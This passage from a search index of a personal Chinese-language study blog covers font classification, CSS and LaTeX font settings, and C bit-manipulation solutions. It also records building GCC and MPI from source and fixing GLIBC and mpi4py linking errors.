\u5b57\u4f53\uff1a\u6709\u886c\u7ebf\uff0c\u610f\u601d\u662f\u5728\u5b57\u7684\u7b14\u753b\u5f00\u59cb\u3001\u7ed3\u675f\u7684\u5730\u65b9\u6709\u989d\u5916\u7684\u88c5\u9970\uff0c\u800c\u4e14\u7b14\u753b\u7684\u7c97\u7ec6\u4f1a\u6709\u6240\u4e0d\u540c\u3002\u7c7b\u4f3c\u4e8e\u4e2d\u6587\u4e2d\u7684\u987f\u7b14\u3002Serif \u5b57\u4f53\u7684\u4f8b\u5b50\u5305\u62ec Times\u3001Georgia\u3001Sung or Song(\u5b8b\u4f53)\u3002</p> <p>Glyphs of serif fonts, as the term is used in CSS, tend to have finishing strokes, flared or tapering ends, or have actual serifed endings (including slab serifs). Serif fonts are typically proportionately-spaced. They often display a greater variation between thick and thin strokes than fonts from the 'sans-serif' generic font family.  </p> </li> </ul> <ul> <li> <p>Sans-serif \u5b57\u4f53\uff1a\u65e0\u886c\u7ebf\uff0c\u4e0e serif \u76f8\u53cd\uff0c\u6ca1\u6709\u989d\u5916\u7684\u88c5\u9970\uff0c\u800c\u4e14\u7b14\u753b\u7684\u7c97\u7ec6\u5dee\u4e0d\u591a\u3002Sans-serif \u5b57\u4f53\u7684\u4f8b\u5b50\u5305\u62ec Helvetica\u3001Arial\u3001\u9ed1\u4f53\u3002</p> <p>Glyphs in sans-serif fonts, as the term is used in CSS, tend to have stroke endings that are plain -- with little or no flaring, cross stroke, or other ornamentation. Sans-serif fonts are typically proportionately-spaced.  </p> </li> </ul> <ul> <li>Monospace \u5b57\u4f53\uff1a\u7b49\u5bbd\u5b57\u4f53\uff0c\u4e5f\u53eb typewrite \u5b57\u4f53\u3002\u5b83\u4eec\u901a\u5e38\u7528\u4e8e\u6a21\u62df\u6253\u5b57\u673a\u6253\u51fa\u7684\u6587\u672c\u3001\u8001\u5f0f\u70b9\u9635\u6253\u5370\u673a\u7684\u8f93\u51fa\uff0c\u751a\u81f3\u66f4\u8001\u5f0f\u7684\u89c6\u9891\u663e\u793a\u7ec8\u7aef\u3002\u53ef\u4ee5\u6709\u886c\u7ebf\u6216\u6ca1\u6709\u886c\u7ebf\u3002Monospace \u5b57\u4f53\u7684\u4f8b\u5b50\u5305\u62ec Courier New, Consolas\u3002</li> </ul> <ul> <li>Cursive \u5b57\u4f53\uff1a\u8fd9\u4e9b\u5b57\u4f53\u8bd5\u56fe\u6a21\u4eff\u4eba\u7684\u624b\u5199\u4f53\u3002Cursive \u5b57\u4f53\u7684\u4f8b\u5b50\u5305\u62ec Zapf Chancery\u3001Author \u548c Comic Sans\u3002</li> </ul> <ul> <li> <p>Fantasy \u5b57\u4f53\uff1a\u5f62\u72b6\u662f\u7279\u522b\u8bbe\u8ba1\u7684\uff0c\u4f46\u4ecd\u7136\u8868\u793a\u5b57\u7b26\u3002\u8fd9\u6837\u7684\u5b57\u4f53\u5305\u62ec Latin fontsAlpha Geometrique, Critter, Cottonwood, FB Reactor, Studz\u3002</p> <p>Fantasy fonts, as used in CSS, are primarily decorative while still containing representations of characters (as opposed to Pi or Picture fonts, which do not represent characters).  </p> </li> </ul> <p>\u672f\u8bed typeface \u4e5f\u8868\u793a font family \u7684\u610f\u601d</p>","tags":["\u5b57\u4f53"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/10/11/2020-10-11-%E5%AD%97%E4%BD%93%E5%88%86%E7%B1%BB/#font-style","title":"font style","text":"<p>\u5b57\u4f53\u6837\u5f0f (font style) \u7528\u4e8e\u5f3a\u8c03 (highlight) \u6587\u6863\u4e2d\u7684\u91cd\u8981\u6982\u5ff5\uff0c\u4f7f\u5176\u53d8\u5f97\u66f4\u52a0\u53ef\u8bfb\u3002</p> <p>\u5e38\u89c1\u7684\u6837\u5f0f\u6709</p> <ul> <li>bold</li> </ul> <ul> <li> <p>italic</p> <p>In European typefaces, especially Roman ones, a slope or slanted style is used to emphasize important words. This is called italic type or oblique type.  </p> <p>'italic' is commonly used to label slanted text, but slanted text may also be labeled as being Oblique, Slanted, Incline, Cursive or Kursiv.  </p> </li> </ul> <ul> <li>underlined</li> </ul>","tags":["\u5b57\u4f53"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/10/11/2020-10-11-%E5%AD%97%E4%BD%93%E5%88%86%E7%B1%BB/#font-weight","title":"font weight","text":"<p>\u5b57\u4f53\u7c97\u7ec6 (font weight) \u6709\u4e0d\u540c\u7684\u5206\u7c7b\u65b9\u6cd5\u3002</p> <p>Attempts to systematize a range of weights led to a numerical classification first used by Adrian Frutiger with the Univers typeface: 35 Extra Light, 45 Light, 55 Medium or Regular, 65 Bold, 75 Extra Bold, 85 Extra Bold, 95 Ultra Bold or Black.  </p> <p>The TrueType font format introduced a scale from 100 through 900, which is also used in CSS and OpenType, where 400 is regular (roman or plain).</p> <p>The Mozilla Developer Network provides the following rough mapping[3] to typical font weight names:</p> Names Numerical values Thin / Hairline 100 Ultra-light / Extra-light 200 Light 300 Normal / regular 400 Medium 500 Semi-bold / Demi-bold 600 Bold 700 Extra-bold / Ultra-bold 800 Extra-black / Ultra-black 950 Heavy / Black 900","tags":["\u5b57\u4f53"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/10/11/2020-10-11-%E5%AD%97%E4%BD%93%E5%88%86%E7%B1%BB/#font-size","title":"font size","text":"<p>\u5b57\u4f53\u5927\u5c0f (font size) \u4e5f\u53eb\u5b57\u53f7\uff0c\u5355\u4f4d\u4e3a pt</p> <p>One such scheme, invented and popularized by Adobe Systems, refers to the variant fonts by the applications they are typically used for, with the exact point sizes intended varying slightly by typeface:</p> Poster Extremely large sizes, usually larger than 72 point Display Large sizes, typically 19\u201372 point Subhead Large text, typically about 14\u201318 point (Regular) Usually left unnamed, typically about 10\u201313 point Small Text (SmText) Typically about 8\u201310 point Caption Very small, typically about 4\u20138 point","tags":["\u5b57\u4f53"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/10/11/2020-10-11-%E5%AD%97%E4%BD%93%E5%88%86%E7%B1%BB/#css-\u4e2d\u8bbe\u7f6e\u5b57\u4f53","title":"css \u4e2d\u8bbe\u7f6e\u5b57\u4f53","text":"","tags":["\u5b57\u4f53"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/10/11/2020-10-11-%E5%AD%97%E4%BD%93%E5%88%86%E7%B1%BB/#font-\u5c5e\u6027","title":"font-*\u5c5e\u6027","text":"<ul> <li> <p>font-family</p> <p>serif | sans-serif | monospace | cursive | fantasy | \u5177\u4f53 typeface</p> <p>\u53ef\u4ee5\u6307\u5b9a\u591a\u4e2a\uff0c\u7528\u9017\u53f7\u9694\u5f00\uff0c\u524d\u9762\u7684\u4f18\u5148\u7ea7\u9ad8\u3002\u63a8\u8350\u5148\u5199\u5177\u4f53\u5b57\u4f53\uff0c\u7ed3\u5c3e\u8865\u5145\u4e00\u4e2a\u901a\u7528 font family\u3002\u5982 font-family: Arial, sans-serif;</p> </li> </ul> <ul> <li> <p>font-style</p> <p>normal | italic | oblique</p> </li> </ul> <ul> <li> <p>font-variant</p> <p>normal | small-caps</p> </li> </ul> <ul> <li>font-weight   normal | bold | bolder | lighter | 100 | 200 | 300 | 400 | 500 | 600 | 700 | 800 | 900  </li> </ul> <ul> <li> <p>font-size</p> <p>\u7565</p> </li> </ul>","tags":["\u5b57\u4f53"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/10/11/2020-10-11-%E5%AD%97%E4%BD%93%E5%88%86%E7%B1%BB/#font-\u5c5e\u6027_1","title":"font \u5c5e\u6027","text":"<p>\u4f9d\u6b21\u8bbe\u7f6e font-style, font-variant, font-weight, font-size/line-height, font-family</p> <pre><code>font:italic bold 12px/30px arial,sans-serif;\n</code></pre>","tags":["\u5b57\u4f53"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/10/11/2020-10-11-%E5%AD%97%E4%BD%93%E5%88%86%E7%B1%BB/#latex-\u4e2d\u8bbe\u7f6e\u5b57\u4f53","title":"LaTex \u4e2d\u8bbe\u7f6e\u5b57\u4f53","text":"","tags":["\u5b57\u4f53"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/10/11/2020-10-11-%E5%AD%97%E4%BD%93%E5%88%86%E7%B1%BB/#font-size-style-family","title":"Font size, style, family","text":"Command Output \\tiny \\scriptsize \\footnotesize \\small \\normalsize \\large \\Large \\LARGE \\huge \\Huge <p>Font styles</p> style command switch command output medium <code>\\textmd{Sample Text 0123}</code> <code>\\mdseries</code> bold <code>\\textbf{Sample Text 0123}</code> <code>\\bfseries</code> upright <code>\\textup{Sample Text 0123}</code> <code>\\upshape</code> italic <code>\\textit{Sample Text 0123}</code> <code>\\itshape</code> slanted <code>\\textsl{Sample Text 0123}</code> <code>\\slshape</code> small caps <code>\\textsc{Sample Text 0123}</code> <code>\\scshape</code> <p>Default font families</p> typeface = family command switch command output serif (roman) <code>\\textrm{Sample Text 0123}</code> <code>\\rmfamily</code> sans serif <code>\\textsf{Sample Text 0123}</code> <code>\\sffamily</code> typewriter (monospace) <code>\\texttt{Sample Text 0123}</code> <code>\\ttfamily</code>","tags":["\u5b57\u4f53"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/10/11/2020-10-11-%E5%AD%97%E4%BD%93%E5%88%86%E7%B1%BB/#underlined-emphasising","title":"Underlined, emphasising","text":"<p>Underlining text is very simple too, use the \\underline command:</p> <pre><code>Some of the greatest \ndiscoveries in \\underline{science} \nwere made by accident.\n</code></pre> <p></p> <p>Text can be emphasized by using \\emph command. Sometimes the \\emph command behaves just as \\textit, but is not exactly the same:</p> <pre><code>Some of the greatest \\emph{discoveries} \nin science \nwere made by accident.\n\n\\textit{Some of the greatest \\emph{discoveries} \nin science \nwere made by accident.}\n\n\\textbf{Some of the greatest \\emph{discoveries} \nin science \nwere made by accident.}\n</code></pre> <p></p>","tags":["\u5b57\u4f53"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/10/11/2020-10-11-%E5%AD%97%E4%BD%93%E5%88%86%E7%B1%BB/#supporting-modern-fonts-with-xelatex","title":"Supporting modern fonts with XeLaTeX","text":"<p>Even though LATEX provides an extensive set of fonts, you may want to use an an external font you really like and you have already installed system-wide, this is possible with XeTeX. XeTeX is a TEX typesetting engine using Unicode and supporting modern font technologies such as OpenType (OTF), TrueType (TTF), Graphite, and Apple Advanced Typography (AAT). The corresponding compilers are <code>xetex</code> and <code>xelatex</code>.</p> <p>\u4ee5\u4e0b\u4ee3\u7801\u4e3a 3 \u79cd\u901a\u7528\u5b57\u4f53\u5bb6\u65cf\u8bbe\u7f6e\u4e86\u9ed8\u8ba4\u7684\u5b57\u4f53\u3002</p> <pre><code>\\usepackage{fontspec}\n\n\n  %This would work on a standard latex installation, (your local computer) \n  %-----------------------------------------------------------------------\n  \\setromanfont{Times New Roman}\n  \\setsansfont{Arial}\n  \\setmonofont[Color={0019D4}]{Courier New}\n  %-----------------------------------------------------------------------\n</code></pre> <p>\u4ee5\u4e0b\u4ee3\u7801\u4f7f\u7528\u5b57\u4f53\u6587\u4ef6\u8bbe\u7f6e\u5b57\u4f53</p> <pre><code>\\usepackage{fontspec}\n\n\n% Times New Roman\n\\setromanfont[\nBoldFont=timesbd.ttf,\nItalicFont=timesi.ttf,\nBoldItalicFont=timesbi.ttf,\n]{times.ttf}\n% Arial\n\\setsansfont[\nBoldFont=arialbd.ttf,\nItalicFont=ariali.ttf,\nBoldItalicFont=arialbi.ttf\n]{arial.ttf}\n% Courier New\n\\setmonofont[Scale=0.90,\nBoldFont=courbd.ttf,\nItalicFont=couri.ttf,\nBoldItalicFont=courbi.ttf,\nColor={0019D4}\n]{cour.ttf}\n</code></pre>","tags":["\u5b57\u4f53"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/10/11/2020-10-11-%E5%AD%97%E4%BD%93%E5%88%86%E7%B1%BB/#\u53c2\u8003\u6587\u732e","title":"\u53c2\u8003\u6587\u732e","text":"<ol> <li>Wikipedia: font</li> <li>W3C: fonts</li> <li>Overleaf: Font sizes, families, and styles</li> <li>Overleaf: Bold, italics and underlining</li> <li>Overleaf: Supporting modern fonts with XeLaTeX</li> </ol>","tags":["\u5b57\u4f53"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/05/23/2022-05-23-%E4%BD%8D%E6%93%8D%E4%BD%9Ctricky/","title":"\u4f4d\u64cd\u4f5c tricky","text":"<p>\u4f4d\u64cd\u4f5c tricks</p> <ul> <li>int</li> <li>float</li> </ul>","tags":["\u4f4d\u64cd\u4f5c"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/05/23/2022-05-23-%E4%BD%8D%E6%93%8D%E4%BD%9Ctricky/#int","title":"int","text":"<pre><code> //\u4ee5\u4e0b\u6240\u6709\u53d8\u91cf\u9ed8\u8ba4\u5747\u4e3a int \u7c7b\u578b\n !!x;  //\u7f29\u4f4d\u6216 (x \u975e 0)\n !(~x);  //\u7f29\u4f4d\u4e0e (x \u5168 1)\n    !(x^y);  //x==y\n ~x + 1;  //-x\uff0c\u5982\u679c x \u4e3a 0x80000000\uff0c\u8fd4\u56de 0x80000000\n\n mask = x&gt;&gt;31;\n x = (~x+1) &amp; mask | x &amp; ~mask; //abs(x), mask \u7528\u6cd5\n\n ~(~x &amp; ~y); //x | y\n\n\n\n/* howManyBits - return the minimum number of bits required to represent x in\n     *             two's complement\n     *  Examples: howManyBits(12) = 5\n     *            howManyBits(298) = 10\n     *            howManyBits(-5) = 4\n     *            howManyBits(0)  = 1\n     *            howManyBits(-1) = 1\n     *            howManyBits(0x80000000) = 32\n     *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;\n     *  Max ops: 90\n     *  Rating: 4\n     */\nint howManyBits(int x)      //Mark\n{\n    //ref: https://github.com/jerrylzy/CS33/blob/master/Lab/datalab/bits.c\n    /*\n     * We first bit invert all negative numbers and\n     * use binary search to find out the log2(n).\n     * Then we add 1 to the final result since we need\n     * the MSB to represent the sign.\n     * Note: finding the following things are equal:\n     * 1. find the most significant bit of 1 for positive numbers\n     * 2. find the most significant bit of 0 for negative numbers\n     */\n    int mask = x&gt;&gt;31;\n    x = (x &amp; ~mask) | (~x &amp; mask);\n\n    //the algorithem get the unsigned int bit width(Most Significant One bit to LSb)\n    int bit16, bit8, bit4, bit2, bit1, bit0;\n    bit16 = (!!(x&gt;&gt;16))&lt;&lt;4;\n    x = x &gt;&gt; bit16;\n\n    bit8 = (!!(x&gt;&gt;8))&lt;&lt;3;\n    x = x &gt;&gt; bit8;\n\n    bit4 = (!!(x&gt;&gt;4))&lt;&lt;2;\n    x = x &gt;&gt; bit4;\n\n    bit2 = (!!(x&gt;&gt;2))&lt;&lt;1;\n    x = x &gt;&gt; bit2;\n\n    bit1 = (x&gt;&gt;1)&amp;1;\n    x = x &gt;&gt; bit1;\n\n    bit0 = x&amp;1;\n\n    return bit16 + bit8 + bit4 + bit2 + bit1 + bit0 + 1; //plus 1 for 2's complement's sign bit\n}\n\n//find the one bit number in x\nint count_one_8(unsigned int x){\n    /*\n     * Firstly, we split the 32 bits to 11 groups, 3 bits per group(except the last group), \n     * Then we can caculate the sum of 3 bits in eache group by  \n     * expression: x - (x&gt;&gt;1) -(x&gt;&gt;2) = x2 + x1 + x0 (x=[x2, x1, x0])\n     * Then we sum each two contiguous group by a shift-add: tmp + (tmp&gt;&gt;3)\n     * The sum(after masked) will be (x0+x1+...x5) + (x6+x7+...x11)*(2^6)^1 + \n     * (x12+x13+...x17)*(2^6)^2+...\n     * Last, we can get (x0+x1+...x63)%63 by caculate the sum mod 63.\n     */\n    unsigned int tmp;\n    tmp = x - ((x&gt;&gt;1)&amp;033333333333) - ((x&gt;&gt;2)&amp;011111111111);\n    return ((tmp + (tmp&gt;&gt;3))&amp;030707070707)%63;\n}\n\n//same way with 4 bits per group\nint count_one_16(unsigned int x){\n    unsigned int tmp;\n    tmp = x - ((x&gt;&gt;1)&amp;0x77777777) - ((x&gt;&gt;2)&amp;0x33333333) - ((x&gt;&gt;3)&amp;0x11111111);\n    return ((tmp + (tmp&gt;&gt;4))&amp;0x0f0f0f0f)%255;\n}\n</code></pre>","tags":["\u4f4d\u64cd\u4f5c"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/05/23/2022-05-23-%E4%BD%8D%E6%93%8D%E4%BD%9Ctricky/#float","title":"float","text":"<pre><code>//float\n/* \n * floatScale2 - Return bit-level equivalent of expression 2*f for\n *   floating point argument f.\n *   Both the argument and result are passed as unsigned int's, but\n *   they are to be interpreted as the bit-level representation of\n *   single-precision floating point values.\n *   When argument is NaN, return argument\n *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while\n *   Max ops: 30\n *   Rating: 4\n */\nunsigned floatScale2(unsigned uf)\n{\n    unsigned int m = uf&amp;0x7fffff;\n    unsigned int exp = (uf&gt;&gt;23)&amp;0xff;\n    unsigned int symbol = uf&gt;&gt;31;\n    if(exp==255){\n        return uf;\n    }else if(exp==0){\n        if(m&amp;0x400000){\n            exp++;\n            m&lt;&lt;=1;\n        }else{\n            m&lt;&lt;=1;\n        }\n    }else{\n        exp++;\n    }\n    return (symbol&lt;&lt;31) | (exp&lt;&lt;23) | (m&amp;0x7fffff);\n}\n</code></pre> <pre><code>/* \n * floatFloat2Int - Return bit-level equivalent of expression (int) f\n *   for floating point argument f.\n *   Argument is passed as unsigned int, but\n *   it is to be interpreted as the bit-level representation of a\n *   single-precision floating point value.\n *   Anything out of range (including NaN and infinity) should return\n *   0x80000000u.\n *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while\n *   Max ops: 30\n *   Rating: 4\n */\nint floatFloat2Int(unsigned uf)\n{\n    int m = uf&amp;0x7fffff;\n    int exp = ((uf&gt;&gt;23)&amp;0xff) - 127;\n    int symbol = uf&gt;&gt;31;\n    int out = 0;\n\n    //[-2^31, 2^31-1]\n    if(exp&lt;0){\n        return 0;\n    }else if(exp&lt;=23){\n        out = (0x800000|m)&gt;&gt;(23-exp);\n    }else if(exp&lt;=30){\n        out = (0x800000|m)&lt;&lt;(exp-23);\n    }else{\n        return 0x80000000;\n    }\n    return symbol ? ~out + 1 : out;\n}\n</code></pre>","tags":["\u4f4d\u64cd\u4f5c"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/08/04/2022-08-04-gcc-mpi%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/","title":"gcc mpi \u6e90\u7801\u7f16\u8bd1","text":"<p>gcc mpi \u6e90\u7801\u7f16\u8bd1\u8fc7\u7a0b\u8bb0\u5f55</p>","tags":["gcc","mpi"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/08/04/2022-08-04-gcc-mpi%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/#gcc","title":"GCC","text":"","tags":["gcc","mpi"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/08/04/2022-08-04-gcc-mpi%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/#\u4e0b\u8f7d\u6e90\u7801","title":"\u4e0b\u8f7d\u6e90\u7801","text":"<ul> <li>\u5b98\u65b9GNU Mirror List - GNU Project - Free Software Foundation<ul> <li>https://ftp.gnu.org/gnu/</li> <li>http://ftp.gnu.org/gnu/</li> </ul> </li> </ul> <ul> <li>\u56fd\u5185\u955c\u50cf<ul> <li>https://mirrors.aliyun.com/gnu/</li> <li>https://mirrors.ustc.edu.cn/gnu/</li> <li>https://mirrors.tuna.tsinghua.edu.cn/gnu/</li> </ul> </li> </ul>","tags":["gcc","mpi"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/08/04/2022-08-04-gcc-mpi%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/#configure","title":"Configure","text":"<p>\u6ce8\u610f\uff1a</p> <ul> <li>\u4e0d\u80fd\u5728 src \u76ee\u5f55 configure\uff0c\u800c\u662f\u5e94\u8be5\u53e6\u5916\u521b\u5efa\u4e00\u4e2a build \u76ee\u5f55</li> <li>gcc \u63d0\u4f9b\u4e86\u4f9d\u8d56\u5b89\u88c5\u811a\u672c\uff0c\u4e0d\u7528\u624b\u52a8\u53bb\u4e0b\u8f7d</li> </ul> <pre><code>cd /tmp/dir\nwget https://mirrors.ustc.edu.cn/gnu/gcc/gcc-8.5.0/gcc-8.5.0.tar.xz\ntar xf gcc-8.5.0.tar.xz\ncd gcc-8.5.0\n#\u5b89\u88c5\u4f9d\u8d56\n./contrib/download_prerequisites\n\n#\u5728build\u76ee\u5f55\u4e0bconfigure\ncd ..\nmkdir build\ncd build\n\n../gcc-8.5.0/configure --disable-multilib --prefix=$HOME/ENV/gcc-8.5.0 --enable-languages=c,c++\n\nmake -j 2&gt;&amp;1 |tee make.log #32\u7ebf\u7a0b\u7f16\u8bd1\u5927\u698240\u5206\u949f\u5de6\u53f3\nmake install\n</code></pre> <ul> <li>--disable-multilib\uff1agcc \u9ed8\u8ba4\u652f\u6301\u7f16\u8bd1 32 \u4f4d\u7a0b\u5e8f (-m32)\uff0c\u5173\u95ed\u6b64\u529f\u80fd</li> </ul>","tags":["gcc","mpi"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/08/04/2022-08-04-gcc-mpi%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/#\u89e3\u51b3\u94fe\u63a5\u5e93\u9519\u8bef","title":"\u89e3\u51b3\u94fe\u63a5\u5e93\u9519\u8bef","text":"<p>\u539f\u56e0\uff0c\u7a0b\u5e8f\u662f\u52a8\u6001\u94fe\u63a5\u7684\u3002\u8fd0\u884c\u65f6\u4f7f\u7528\u7684\u662f\u7cfb\u7edf\u7684\u5e93\u3002\u800c\u7cfb\u7edf\u7684\u5e93\u548c\u7f16\u8bd1\u65f6\u4f7f\u7528\u7684\u5e93\u4e0d\u517c\u5bb9\u3002</p> <ul> <li> <p>\u65b9\u6cd5\u4e00\uff1a\u4fee\u6539<code>LD_LIBRARY_PATH</code>\u73af\u5883\u53d8\u91cf</p> <pre><code>export LD_LIBRARY_PATH=$HOME/opt/gcc-9.1.0/lib64\n</code></pre> </li> </ul> <ul> <li> <p>\u65b9\u6cd5\u4e8c\uff1a\u7f16\u8bd1\u65f6\u5c06\u5e93\u641c\u7d22\u8def\u5f84\u5b58\u5728\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e2d</p> <pre><code>~/opt/gcc-9.1.0/bin/g++ -Wl,-rpath=$HOME/opt/gcc-9.1.0/lib64 --std=c++17 demo.cc -o demo\n</code></pre> </li> </ul> <ul> <li> <p>\u65b9\u6cd5\u4e09\uff1a\u9759\u6001\u94fe\u63a5</p> <pre><code>~/opt/gcc-9.1.0/bin/g++ --std=c++17 demo.cc -o demo -static-libstdc++ -static-libgcc\n</code></pre> </li> </ul>","tags":["gcc","mpi"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/08/04/2022-08-04-gcc-mpi%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/#\u9047\u5230\u7684\u95ee\u9898","title":"\u9047\u5230\u7684\u95ee\u9898","text":"","tags":["gcc","mpi"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/08/04/2022-08-04-gcc-mpi%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/#\u89e3\u538b\u6e90\u7801\u5f88\u6162","title":"\u89e3\u538b\u6e90\u7801\u5f88\u6162","text":"<p>\u670d\u52a1\u5668\u4e0a\u89e3\u538b 60M \u7684\u6e90\u7801\u975e\u5e38\u6162\uff0c\u89e3\u538b\u4e86 10-20 \u5206\u949f\u3002\u4e0d\u53ea\u662f\u89e3\u538b\uff0ccp, rm \u6e90\u7801\u76ee\u5f55\u90fd\u975e\u5e38\u7684\u6162\u3002\u63a8\u6d4b\u662f NFS \u7684\u539f\u56e0\u3002</p> <p>\u89e3\u51b3\u65b9\u6cd5\u4e3a\u4f7f\u7528\u672c\u5730\u76ee\u5f55\uff0c\u5982/tmp</p>","tags":["gcc","mpi"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/08/04/2022-08-04-gcc-mpi%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/#gcc830-make-\u5931\u8d25","title":"gcc8.3.0 make \u5931\u8d25","text":"<p>[Building gcc 8.3 Makefile:955: all] Error 2 - Stack Overflow</p> <p>\u597d\u50cf\u662f 8.3.0 \u81ea\u8eab\u7684\u95ee\u9898\uff0c\u6362\u7528 8.5.0 \u7f16\u8bd1\u6210\u529f</p>","tags":["gcc","mpi"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/08/04/2022-08-04-gcc-mpi%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/#gcc-\u4f7f\u7528","title":"GCC \u4f7f\u7528","text":"","tags":["gcc","mpi"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/08/04/2022-08-04-gcc-mpi%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/#glibc_xxx-not-found","title":"GLIBC_xxx Not Found","text":"<p>\u67e5\u770b glibc \u7248\u672c</p> <ul> <li>20.04: GLIBC_2.30</li> <li>22.04: GLIBC_2.35 <pre><code>strings /lib/x86_64-linux-gnu/libc.so.6 |grep GLIBC\n</code></pre></li> </ul> <p>\u51e0\u4e4e\u6240\u6709\u8f6f\u4ef6\u90fd\u4f1a\u52a8\u6001\u8fde\u63a5\u5230 glibc \u5e93\uff0c\u56e0\u6b64\u8f6f\u4ef6\u5982\u679c\u662f\u5728\u9ad8\u7248\u672c\u7684\u673a\u5668\u4e0a\u7f16\u8bd1\u7684\uff0c\u90a3\u4e48\u5728\u4f4e\u7248\u672c\u673a\u5668\u4e0a\u8fd0\u884c\u5c31\u4f1a\u62a5\u9519\u3002</p> <pre><code>strings /staff/fyyuan/install/mpich/lib/libmpi.so.12.4.2 |grep GLIBC |tail\n__isoc99_fscanf@GLIBC_2.7\ntoupper@GLIBC_2.2.5\nlseek@GLIBC_2.2.5\nferror@GLIBC_2.2.5\ngetifaddrs@GLIBC_2.3\nclock_getres@GLIBC_2.17\nopenat@GLIBC_2.4\nqsort@GLIBC_2.2.5\nlstat@GLIBC_2.33\nfwrite@GLIBC_2.2.5\n</code></pre>","tags":["gcc","mpi"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/08/04/2022-08-04-gcc-mpi%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/#mpi-\u4f7f\u7528","title":"MPI \u4f7f\u7528","text":"","tags":["gcc","mpi"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/08/04/2022-08-04-gcc-mpi%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/#\u9047\u5230\u7684\u95ee\u9898_1","title":"\u9047\u5230\u7684\u95ee\u9898","text":"","tags":["gcc","mpi"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/08/04/2022-08-04-gcc-mpi%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/#mpi4py-\u4f9d\u8d56\u56fa\u5b9a\u8def\u5f84\u7684-libmpiso","title":"mpi4py \u4f9d\u8d56\u56fa\u5b9a\u8def\u5f84\u7684 libmpi.so","text":"<p>\u5df2\u7ecf\u786e\u5b9a PATH\u3001LIB_LIBRARY_PATH \u4e2d\u6ca1\u6709\u81ea\u5df1\u7f16\u8bd1\u7684\u8def\u5f84\u4e86\u3002\u8fd0\u884c\u4e00\u4e2a\u7b80\u5355\u7684\u6d4b\u8bd5\u4ecd\u7136\u56fa\u5b9a\u4f9d\u8d56\u4e8e\u6211\u7684 libmpi.so</p> <pre><code>(base) \u279c  ~ mpiexec -n 2 python test_mpi2.py\nTraceback (most recent call last):\n  File \"test_mpi2.py\", line 1, in &lt;module&gt;\n    from mpi4py import MPI\nImportError: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.32' not found (required by /staff/fyyuan/install/mpich/lib/libmpi.so.12)\nTraceback (most recent call last):\n  File \"test_mpi2.py\", line 1, in &lt;module&gt;\n    from mpi4py import MPI\nImportError: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.32' not found (required by /staff/fyyuan/install/mpich/lib/libmpi.so.12)\n</code></pre> <p>\u5f53\u524d python \u4e3a conda \u7684 base\uff0c\u5176\u4e2d mpi4py \u662f\u7528 pip \u5b89\u88c5\u7684\u3002\u53d1\u73b0 conda \u91cd\u65b0\u5b89\u88c5\u5373\u53ef <pre><code> pip uninstall mpi4py\nFound existing installation: mpi4py 4.0.0\nUninstalling mpi4py-4.0.0:\n  Would remove:\n    /staff/fyyuan/miniconda3/lib/python3.8/site-packages/mpi4py-4.0.0.dist-info/*\n    /staff/fyyuan/miniconda3/lib/python3.8/site-packages/mpi4py/*\nProceed (Y/n)? y\n  Successfully uninstalled mpi4py-4.0.0\n\nconda install mpi4py\n</code></pre></p> <p>\u795e\u5947\u7684\u662f\u5b83\u628a mpiexec \u66f4\u6539\u4e86 <pre><code>which 